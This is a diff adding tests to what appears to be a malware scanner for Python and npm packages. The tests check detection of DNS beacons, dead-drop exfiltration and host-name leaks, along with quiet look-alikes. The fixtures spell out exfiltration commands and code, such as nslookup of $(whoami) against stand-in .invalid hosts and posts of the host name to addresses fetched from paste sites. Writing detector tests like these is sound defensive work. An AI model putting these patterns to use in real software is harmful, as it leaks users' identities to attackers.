@@ -21,6 +21,18 @@ import-time code, the files a package runs when used:
 * at install time, a raw socket to a hard-coded address, and browser
   shortcuts rewritten to load an extension.
 
+0.1.8 (the backlog's "what the exfiltration shapes don't read"):
+
+* the DNS beacon's name built outside an f-string or a template literal —
+  a sum, a %-format or a str.format(), a name assigned one of those, a
+  lookup command written in code — or in a shell command whose host holds
+  `$(whoami)`, $USER, %USERNAME% … (a reserved domain, .local or .internal,
+  is a machine looking itself up);
+* a dead drop: the host name sent to an address the code fetched at run
+  time from a hard-coded URL (data-pipeline-check's webhooks);
+* the host name read through require('os') or a name imported from it
+  (@helpcentre/tesco-help: `require('os').hostname()`).
+
 Each has crafted look-alikes that stay quiet. The secrets are fake and built
 here rather than written out whole; hosts are .invalid or TEST-NET; nothing
 runs. The npm engine is held to the same answers by
@@ -155,6 +167,110 @@ class HostAndAddressTests(unittest.TestCase):
                 self.assertEqual(on_import(text)[0], [])
 
 
+class BuiltNamesAndDeadDropTests(unittest.TestCase):
+    """0.1.8: the DNS beacon's name built outside a template, a dead drop, the
+    host name through require('os')."""
+    DNS = "sends the machine's user or host name in a DNS lookup of a name it builds"
+
+    def test_names_built_in_code(self):
+        for text, lang in (
+                ("const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\n"
+                 "dns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"),
+                ("const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\n"
+                 "dns.resolve(q, () => {});\n", "js"),
+                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"),
+                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"),
+                ("import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
+                 "socket.getaddrinfo(q, 80)\n", "py"),
+                ("import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"),
+                ("import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n", "py")):
+            with self.subTest(text=text):
+                reasons, sev = on_import(text, lang)
+                self.assertIn(self.DNS, reasons)
+                self.assertEqual(sev, "CRITICAL")
+
+    def test_names_built_in_a_shell_command(self):
+        for cmd in ("nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
+                    "curl -s http://$(whoami).x.invalid.com/p", "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
+                    "dig $USER.x.invalid.com", "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"):
+            with self.subTest(cmd=cmd):
+                self.assertIn(self.DNS, core.install_script_risk(cmd))
+
+    def test_quiet_look_alikes(self):
+        # a machine looking itself up; a reserved domain; an assignment, not a lookup; the identity in a
+        # path; a service record of a zone; constants only
+        for text in ("import socket\nip = socket.gethostbyname(socket.gethostname())\n",
+                     "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
+                     "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
+                     "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com",
+                     "curl -s http://x.invalid.com/$(whoami)",
+                     "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\n"
+                     "os.hostname();\n",
+                     "import socket\nh = socket.gethostname()\nsocket.gethostbyname('api' + '.x.invalid.com')\n"):
+            with self.subTest(text=text):
+                self.assertEqual(core.dns_beacon_at(text, core._HOST_INFO_RE.search(text) is not None), -1)
+
+    def test_a_dead_drop(self):
+        want = "sends the machine's user or host name to an address it fetches at run time (from {})"
+        for text, lang, host in (
+                ("import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+                 "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"),
+                ("import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
+                 "    req = urllib.request.Request('https://x.github.io/c.json')\n"
+                 "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n"
+                 "    return _W\ndef send():\n    for w in hooks()[:2]:\n        urllib.request.urlopen("
+                 "urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n", "py", "x.github.io"),
+                ("const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
+                 "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js",
+                 "x.github.io"),
+                ("const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
+                 "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, "
+                 "{ h: os.hostname() }); })();\n", "js", "gist.githubusercontent.com"),
+                ("const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
+                 "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
+                 "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); "
+                 "r.end(); }); });\n", "js", "x.github.io")):
+            with self.subTest(text=text):
+                reasons, sev = on_import(text, lang)
+                self.assertIn(want.format(host), reasons)
+                self.assertEqual(sev, "CRITICAL")
+                self.assertIn(want.format(host), core.install_script_risk(text))
+
+    def test_dead_drop_look_alikes(self):
+        # a GET of the address; a literal address; a fetch of no literal URL; an update check; an Express
+        # route; no host name read
+        for text in ("import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+                     "requests.get(cfg['url'])\nsocket.gethostname()\n",
+                     "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+                     "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
+                     "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
+                     "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
+                     "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
+                     ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
+                     "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json())"
+                     ".then((c) => { app.post(c.path, h); });\nos.hostname();\n"):
+            with self.subTest(text=text):
+                self.assertIsNone(core.dead_drop_at(text))
+        quiet = ("import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+                 "requests.post(cfg['url'], json={'v': 1})\n")
+        self.assertIsNotNone(core.dead_drop_at(quiet))                 # the shape, but no host name read:
+        self.assertEqual(on_import(quiet), ([], None))                  # not a sign
+
+    def test_the_host_name_through_require_os(self):
+        for text in ("const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
+                     "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
+                     "const { hostname, platform } = require('os');\n"
+                     "fetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
+                     "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', "
+                     "body: userInfo().username });\n",
+                     "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', "
+                     "data=gethostname())\n"):
+            with self.subTest(text=text):
+                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))
+        self.assertEqual(core.install_script_risk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"),
+                         [])
+
+
 class RequestBinTests(unittest.TestCase):
     """RequestBin counts by its host names only: chromedriver's and
     phantomjs-prebuilt's installers define requestBinary() to download their
@@ -246,6 +362,17 @@ class BoundedWorkTests(unittest.TestCase):
             "reverse shell args": "'nc'" + " '-x'," * 50000,
             "monero": "'-o' exec(" + ("4" + "a" * 93 + "! ") * 5000,
             "a long line": "getaddrinfo(f\"" + "{a}." * 50000 + "\n",
+            "dead drop fetches": "import socket\nsocket.gethostname()\n"
+                                 + "c = requests.get('https://x.invalid/c').json()\n" * 5000
+                                 + "requests.post(c['u'], data=1)\n" * 5000,
+            "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')"
+                                + ".then((r) => r)" * 50000 + "\n",
+            "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c"
+                                  + " + c" * 200000 + "\n",
+            "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n" * 20000
+                                  + "socket.gethostbyname(q)\n" * 20000,
+            "dns shell identities": "nslookup " + "$(whoami)" * 100000 + "\n" + "echo "
+                                    + "$(whoami).x.invalid.com " * 50000,
         }
         for label, text in texts.items():
             with self.subTest(label):
